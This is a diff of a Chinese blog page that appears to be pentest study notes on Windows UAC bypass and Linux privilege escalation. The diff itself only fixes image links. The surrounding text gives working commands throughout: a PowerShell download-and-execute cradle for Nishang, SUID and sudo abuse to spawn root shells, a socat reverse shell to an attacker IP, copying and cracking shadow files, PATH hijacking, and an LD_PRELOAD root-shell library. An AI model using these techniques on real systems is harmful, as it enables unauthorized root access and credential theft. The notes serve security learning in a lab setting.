 <h3 id="PowerShell下的绕过UAC提权"><a href="#PowerShell下的绕过UAC提权" class="headerlink" title="PowerShell下的绕过UAC提权"></a>PowerShell下的绕过UAC提权</h3><p>即利用Nishang中Escalation目录下的Invoke-PsUACme.ps1脚本。</p>
 <p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
 <p>执行如下命令：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/nishang/Escalation/Invoke-PsUACme.ps1&#x27;);Invoke-PsUACme -Verbose # 使用sysprep方法并执行默认的payload</span><br><span class="line"></span><br><span class="line">Invoke-PsUACme -method oobe -verbose # 使用oobe方法并执行默认的payload</span><br></pre></td></tr></table></figure>
 
 <p>如下图，执行完后会弹出一个具有管理员权限的shell：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021734707.png" alt="image-20231002173448640"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021734707.png" alt="image-20231002173448640"></p>
 <p>还可以使用 -Payload 参数自行指定要执行的Payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PsUACme -method oobe -verbose -Payload &quot;powershell -windowstyle hidden -e YourBase64EncodedPayload&quot;</span><br></pre></td></tr></table></figure>
 
@@ -457,7 +457,7 @@
 <p><strong>授权信息查看</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l file ###文件</span><br><span class="line">ls -ld westos ###目录</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021641162.png" alt="image-20231002164131090"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021641162.png" alt="image-20231002164131090"></p>
 <p>文件列表信息分为：文件类型、权限、链接数、所属用户、所属用户组、文件大小、最后修改时间、文件名。</p>
 <p>linux一共有7种文件类型,分别如下:</p>
 <p>- ：普通文件</p>
@@ -546,48 +546,48 @@
 <p>即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限。</p>
 <p><strong>cp</strong></p>
 <p>以cp为例，这里给cp添加SUID权限做测试，拥有SUID权限的程序会有rwx变成rws。（rws中的s就是SUID权限）</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021641867.png" alt="image-20231002164155790"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021641867.png" alt="image-20231002164155790"></p>
 <p>可以通过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
 <p>命令来查找拥有SUID权限的程序。</p>
 <p>perm指定权限，-u&#x3D;s代表SUID权限，type指定文件类型，f表示常规文件。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021642168.png" alt="image-20231002164235117"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021642168.png" alt="image-20231002164235117"></p>
 <p>当普通用户运行cp命令时，此时的cp权限就为root，利用时，可以cp把&#x2F;etc&#x2F;passwd复制到桌面，然后进行修改。</p>
 <p>首先用openssl生成一个密码。passwd参数代表生成一个密码，-1为md5，-salt指定盐（随意指定），最后跟要加密的值，也就是密码123456</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021642627.png" alt="image-20231002164244581"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021642627.png" alt="image-20231002164244581"></p>
 <p>在桌面创建一个passwd文件，将&#x2F;etc&#x2F;passwd中的内容复制进去</p>
 <p>然后按照&#x2F;etc&#x2F;passwd的格式添加一个新用户，权限按root的写即可。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021643589.png" alt="image-20231002164325542"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643589.png" alt="image-20231002164325542"></p>
 <p>添加后我们用cp再把文件复制回去进行替换，此时就添加了一个abcd用户，权限为root。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021643707.png" alt="image-20231002164336647"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643707.png" alt="image-20231002164336647"></p>
 <p>提权成功</p>
 <p><strong>find</strong></p>
 <p>find命令在拥有SUID权限的情况下，也可以用来进行提权。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021643009.png" alt="image-20231002164347937"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643009.png" alt="image-20231002164347937"></p>
 <p>只需要使用exec参数即可。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021644588.png" alt="image-20231002164401533"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644588.png" alt="image-20231002164401533"></p>
 <p>find的exec参数用来指定其它命令，以便于来处理搜到的结果。结果的输出，需要以分号来结束，在bash环境中分号代表代码块结束，有特殊意义，所以这里需要进行转义。</p>
 <p><strong>vim</strong></p>
 <p>vim在拥有SUID权限的情况下，也可以用来进行提权</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021644931.png" alt="image-20231002164422861"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644931.png" alt="image-20231002164422861"></p>
 <p>当vim被赋予SUID权限后，意味着如何用户都可以使用vim命令来编辑那些只能由root用户编辑的文件，例如通过vim来编辑&#x2F;etc&#x2F;sudoers文件（普通用户直接访问会被拒绝），在sudoers文件中配置普通用户的权限，权限和root一样，这里以kali用户为例，添加如下内容：</p>
 <p>kali ALL&#x3D;(ALL:ALL) ALL</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021644035.png" alt="image-20231002164458991"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644035.png" alt="image-20231002164458991"></p>
 <p>vim编辑后保存时用**wq!**强制保存，vim运行时虽然是root权限，但wq依然会提示只读</p>
 <p>随后sudo bash 就会获取一个root的shell</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021645465.png" alt="image-20231002164513409"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021645465.png" alt="image-20231002164513409"></p>
 <p><strong>脚本</strong></p>
 <p>除了系统的一些可执行命令，自己写的可执行文件可以以添加SUID权限</p>
 <p>c语言示例代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;sys/types.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    setuid(geteuid());</span><br><span class="line">    system(&quot;/bin/bash&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>使用gcc编译</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021645594.png" alt="image-20231002164551552"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021645594.png" alt="image-20231002164551552"></p>
 <p>编译后传入靶机，放在桌面，然后添加SUID权限进行测试</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021646744.png" alt="image-20231002164600690"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021646744.png" alt="image-20231002164600690"></p>
 <p>普通用户执行该文件，会返回一个root权限的shell</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021646597.png" alt="image-20231002164614560"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021646597.png" alt="image-20231002164614560"></p>
 <p><strong>总结</strong></p>
 <p>有很多命令在被添加SUID权限的情况下，都可以用来进行提权</p>
 <p>更多命令和用法可以参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
@@ -598,14 +598,14 @@
 <p><strong>sudoers文件</strong></p>
 <p>&#x2F;etc&#x2F;sudoers文件，是sudo权限的配置文件。当使用sudo接命令时，linux系统会在sudoers文件中查找当前用户，根据当前用户权限配置来决定是否可以运行相关命令。</p>
 <p>例如添加kali用户的相关配置：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021647748.png" alt="image-20231002164705713"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021647748.png" alt="image-20231002164705713"></p>
 <p>格式如下：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021647565.png" alt="image-20231002164755520"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021647565.png" alt="image-20231002164755520"></p>
 <p><strong>sudo su &amp;&amp; sudo bash</strong></p>
 <p>当没有对普通用户做严格的限制时，或者配置权限过大时，则可以尝试sudo su来切换到root权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648799.png" alt="image-20231002164807747"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648799.png" alt="image-20231002164807747"></p>
 <p>或者执行sudo bash</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648380.png" alt="image-20231002164830340"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648380.png" alt="image-20231002164830340"></p>
 <p>当visudo命令不能用时，限制了部分命令，则可以尝试下vim是否被禁用，sudo vim也可以编辑</p>
 <p>sudoers文件，且wq!可以成功保存。</p>
 <p>（<strong>visudo</strong>命令编辑sudo命令使用的<strong>sudoers</strong>文件）</p>
@@ -620,48 +620,48 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa ALL=(ALL:ALL) /usr/bin/find,/usr/bin/perl,/usr/bin/python3,/usr/bin/less,/usr/bin/awk,/usr/bin/man,/usr/bin/vi</span><br></pre></td></tr></table></figure>
 
 <p>这时aaa用户使用sudo就只能执行配置好的命令，sudo su和sudo bash被禁止执行。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648338.png" alt="image-20231002164844274"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648338.png" alt="image-20231002164844274"></p>
 <p>相关命令提权方式如下：</p>
 <p><strong>find</strong>：exec参数用来指定搜索结果的处理命令，需要以分号结尾，分号在命令行有特殊函数，要用\进行转义。</p>
 <p><strong>perl</strong>：e参数用来指定要运行的命令，然后使用linux的exec参数来调用bash。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648513.png" alt="image-20231002164858472"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648513.png" alt="image-20231002164858472"></p>
 <p><strong>python</strong>：c参数可以在命令行执行python代码，pty库是一个伪终端库，它的spawn会调用指定的程序。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649990.png" alt="image-20231002164916950"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649990.png" alt="image-20231002164916950"></p>
 <p><strong>less</strong>：输入sudo less &#x2F;etc&#x2F;hosts（这里可以是其他文件）命令浏览文件内容时，到底部输入!bash后回车，会获得一个root权限的shell。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649568.png" alt="image-20231002164926527"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649472.png" alt="image-20231002164936434"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649568.png" alt="image-20231002164926527"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649472.png" alt="image-20231002164936434"></p>
 <p><strong>awk</strong>：通过调用linux的system函数来打开bash。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649322.png" alt="image-20231002164951271"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649322.png" alt="image-20231002164951271"></p>
 <p><strong>man</strong>：通过sudo man man命令来打开man的使用手册，同时会进入编辑行，输入!bash回车，可获取root权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021650482.png" alt="image-20231002165002437"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021650294.png" alt="image-20231002165015256"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650482.png" alt="image-20231002165002437"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650294.png" alt="image-20231002165015256"></p>
 <p><strong>vi</strong>：sudo vi会进入vi默认页，输入:!bash回车，可进入root命令行。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021650682.png" alt="image-20231002165029622"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021651584.png" alt="image-20231002165136544"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650682.png" alt="image-20231002165029622"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021651584.png" alt="image-20231002165136544"></p>
 <p>脚本：如果sudoers定义了可以执行某个脚本，则我们可以把返回shell的代码添加进去。</p>
 <p>例如桌面有个运维需要的aaa.sh文件，我们添加一段打开bash的代码，然后sudo运行即可。</p>
 <p>参考代码：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021652817.png" alt="image-20231002165214773"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021652817.png" alt="image-20231002165214773"></p>
 <p><strong>应用程序</strong></p>
 <p>除了上面的一些二进制文件，一些应用程序也可以获取root权限，例如env、ftp、socat、scp。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021652927.png" alt="image-20231002165226882"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021652927.png" alt="image-20231002165226882"></p>
 <p>env(<strong>Linux</strong>系统里的env命令可以显示当前用户的环境变量，还可以用来在指定环境变量下执行其他命令)：</p>
 <p>通过env环境变量来获取root权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021653695.png" alt="image-20231002165331654"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021653695.png" alt="image-20231002165331654"></p>
 <p>ftp：通过ftp来进入bash获取root权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021653912.png" alt="image-20231002165342870"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021653912.png" alt="image-20231002165342870"></p>
 <p>socat(nc加强版)：通过socat客户端连接攻击机，攻击机可获得rootshell。先执行服务端，后执行客户端。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#客户端执行</span><br><span class="line">sudo socat exec:&#x27;sh -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444</span><br><span class="line">#攻击机执行</span><br><span class="line">socat file:`tty`,raw,echo=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021654136.png" alt="image-20231002165406093"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654136.png" alt="image-20231002165406093"></p>
 <p>还有一个scp，scp是一个安全复制文件的命令，它无法获取一个shell，但可以用来复制一些系统的敏感</p>
 <p>文件。例如etc&#x2F;passwd、etc&#x2F;shadow等。</p>
 <p>如下命令，将passwd文件传输到指定机器的root&#x2F;Desktop下，然后再对密码进行破解等操作。（需要开启攻击机的ssh服务）</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021654747.png" alt="image-20231002165416704"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654747.png" alt="image-20231002165416704"></p>
 <p>（配合john爆破etc&#x2F;shadow中的密码）</p>
 <p><strong>黑名单情况</strong></p>
 <p>如果碰到sudoers文件使用黑名单的情况，比如说权限禁用sudo使用find命令，但是都是在ALL基础上设置的，那么可以cp把find复制到其它目录运行。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021654181.png" alt="image-20231002165456122"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654181.png" alt="image-20231002165456122"></p>
 <p><strong>NFS配置不当导致提权</strong></p>
 <p>NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享</p>
 <p>简单配置一下：</p>
@@ -676,34 +676,34 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># nfs通过rpc通信，这里把rpcbind也重启下</span><br><span class="line">sudo /etc/init.d/rpcbind restart</span><br><span class="line">sudo /etc/init.d/nfs-kernel-server restart</span><br></pre></td></tr></table></figure>
 
 <p>此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655543.png" alt="image-20231002165507497"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655543.png" alt="image-20231002165507497"></p>
 <p>或者通过nmap的相关脚本来进行扫描。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655509.png" alt="image-20231002165521449"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655509.png" alt="image-20231002165521449"></p>
 <p><strong>NFS****配置不当可提权</strong></p>
 <p>当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。测试如下：</p>
 <p>首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655094.png" alt="image-20231002165533023"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655094.png" alt="image-20231002165533023"></p>
 <p>此时目标机的home目录下就会有一个具有suid权限的bash。</p>
 <p>普通用户执行即可获取root权限，这里注意需要加上p参数，否则权限还是当前用户的。</p>
 <p>p参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承euid，因为bash有suid权限，所以这里是root。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655261.png" alt="image-20231002165545218"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655261.png" alt="image-20231002165545218"></p>
 <p>使用场景：这个和suid提权很像，给程序赋予suid权限然后利用。不同的是前两篇suid提权是当前用户使用sudo chmod自己修改的，在sudoers禁用sudo命令等情况下，就行不通了。而nfs配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。</p>
 <p>同理，之前总结的suid提权的那些程序也同样适用，这里就不再记了。</p>
 <p><strong>其它命令</strong></p>
 <p>除了可以直接得到shell的，还有其他一些程序不能直接获取，例如nano、vi等。</p>
 <p>例如nano被共享了，则可以给nano一个suid权限，然后来读取敏感文件，爆破密码从而登录。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655831.png" alt="image-20231002165556759"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655831.png" alt="image-20231002165556759"></p>
 <p>然后使用nano -p来读取shadow文件，这里读取时把相关记录复制出来，使用john破解，测试不能重定向，需要权限，所以只能复制。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021656644.png" alt="image-20231002165607584"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021656644.png" alt="image-20231002165607584"></p>
 <p>复制后使用john破解获取相关用户密码，以aaa为例，密码是aaa。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021656521.png" alt="image-20231002165649474"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021656521.png" alt="image-20231002165649474"></p>
 <p>(再次破解相同用户，需要加 –show 参数)</p>
 <p>如果密码太复杂，破解不了，则可以尝试其它用户</p>
 <p>这时候不确定aaa是否为root权限，则可以继续使用nano去编辑passwd文件(.&#x2F;nano &#x2F;etc&#x2F;passwd)，给aaa赋权。</p>
 <p>把原来的1001换成0</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021657208.png" alt="image-20231002165700163"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657208.png" alt="image-20231002165700163"></p>
 <p>然后切换aaa用户即可。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021657300.png" alt="image-20231002165739260"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657300.png" alt="image-20231002165739260"></p>
 <p>利用这种机制，也可以用来修改sudoers文件，添加或修改为以下内容。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>
 
@@ -711,28 +711,28 @@
 <p><strong>使用PATH变量进行提权</strong></p>
 <p>Linux中的PATH是一个环境变量，它指定了可执行程序所在的目录，例如bin和sbin目录，当我们在终端运行一个命令时，系统就会根据PATH来查找相关的可执行文件。</p>
 <p>可以执行env命令列出所有的环境变量，然后找到PATH，或者grep进行结果筛选，或者echo出$PATH值，命令如下。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021657150.png" alt="image-20231002165758111"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657150.png" alt="image-20231002165758111"></p>
 <p><strong>ps结合PATH提权</strong></p>
 <p>首先编译以下c代码，功能为调用ps命令。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    system(&quot;ps&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658904.png" alt="image-20231002165818860"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658904.png" alt="image-20231002165818860"></p>
 <p>随后以root身份赋予777权限，然后再赋予一个suid权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658617.png" alt="image-20231002165829570"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658617.png" alt="image-20231002165829570"></p>
 <p>此时普通用户执行这个shell文件，可以看到就是执行的ps命令。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658376.png" alt="image-20231002165841327"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658376.png" alt="image-20231002165841327"></p>
 <p><strong>利用</strong>：到tmp目录下，把bash写到一个ps文件中，然后修改PATH变量添加tmp目录，再去执行shell，就会获得一个root权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658432.png" alt="image-20231002165853385"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658432.png" alt="image-20231002165853385"></p>
 <p>过程：root给一个可执行文件赋予了suid，而此文件又调用了ps命令，这时修改PATH把tmp添加到头的位置，系统再执行就会先去tmp目录下找，tmp目录下放的是恶意程序，从而导致恶意程序以root权限运行。</p>
 <p>情况：这种情况适用于，给普通用户分配了个可执行程序，且该程序有suid权限，我们又知道该程序会调用哪些命令，那么就可以结合PATH来进行提权。</p>
 <p><strong>cp结合PATH提权</strong></p>
 <p>除了把bash写到ps文件中以外，还可以把类似于sh的可执行程序复制过来。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021659630.png" alt="image-20231002165916588"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021659630.png" alt="image-20231002165916588"></p>
 <p><strong>符号连接结合PATH提权</strong></p>
 <p>还可以通过ln命令来设置一个连接，连接到sh，但条件是当前可执行程序所在目录要有相关权限，我这里就直接sudo创建了。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021659522.png" alt="image-20231002165932468"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021659522.png" alt="image-20231002165932468"></p>
 <p>如果在tmp下创建连接，这里测试并不会调用</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021700381.png" alt="image-20231002170007338"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021700381.png" alt="image-20231002170007338"></p>
 <p><strong>总结</strong></p>
 <p>上面以ps为例，其它命令都可以，例如id、whoami、cat、vim等等，方法都一样，只是改下tmp目录下的文件名。</p>
 <p><strong>使用LD_PRELOAD进行提权</strong></p>
@@ -740,52 +740,52 @@
 <p>测试前先按如下配置一下sudoers文件，以aaa用户为例，添加一个find命令和一个LD_PRELOAD。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaa ALL=(ALL:ALL) NOPASSWD:/usr/bin/find</span><br><span class="line">Defaults env_keep += LD_PRELOAD</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021700081.png" alt="image-20231002170035032"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021700081.png" alt="image-20231002170035032"></p>
 <p>配置用户sudo权限之前有记录过，这里记录下env_keep的说明。</p>
 <p>例如aaa用户有一个aaa的环境变量，当通过su切换到bbb用户时，再查看env环境变量，aaa就没有了，也就意味着用户的切换不会带着环境变量一块切过去。而想保持某个环境不受用户切换的影响，那么可以在sudoers文件中设置env_keep。</p>
 <p><strong>提权测试</strong></p>
 <p>切换回普通用户，查看sudo权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021701537.png" alt="image-20231002170124491"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021701537.png" alt="image-20231002170124491"></p>
 <p>我们有一个find的sudo权，且env_keep中定义了LD_PRELOAD，那么我们就可以定义一个恶意的so文件，然后sudo运行find时指定LD_PRELOAD来加载我们自己的so文件，就可以实现提权</p>
 <p>so文件的c代码如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void _init()</span><br><span class="line">&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    setgid(0);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>然后进行编译-fPIC -shared参数简单理解就是动态编辑共享库，可以进行公共调用，nostartfiles参数代表该库运行不会去调用系统的其它库，避免影响自己的程序执行。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021702470.png" alt="image-20231002170217426"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021702470.png" alt="image-20231002170217426"></p>
 <p>编译后我们使用sudo运行find并指定LD_PRELOAD为我们编译的shell.so文件，这时find就会先调用shell.so，导致我们的代码被执行，返回的权限为root。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021702260.png" alt="image-20231002170237213"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021702260.png" alt="image-20231002170237213"></p>
 <p>注意点：如果使用自己攻击机编译的so文件，传到目标机可能普通用户没有执行权限，这时需要加下权限。如果目标机支持gcc编译，也可以直接在目标机编译。</p>
 <p><strong>总结</strong></p>
 <p>使用情况就是sudoers中的env_keep定义了LD_PRELOAD，然后sudo有相关的命令，那么sudo运行命令时就可以通过LD_PRELOAD来指定恶意so文件。</p>
 <p><strong>利用Cron进行提权</strong></p>
 <p>cronjobs是定时任务，在特定的日期和时间执行计划任务。例如定期备份或者定期清理某个目录等都会用到，定义格式如下：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021703832.png" alt="image-20231002170300781"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021703832.png" alt="image-20231002170300781"></p>
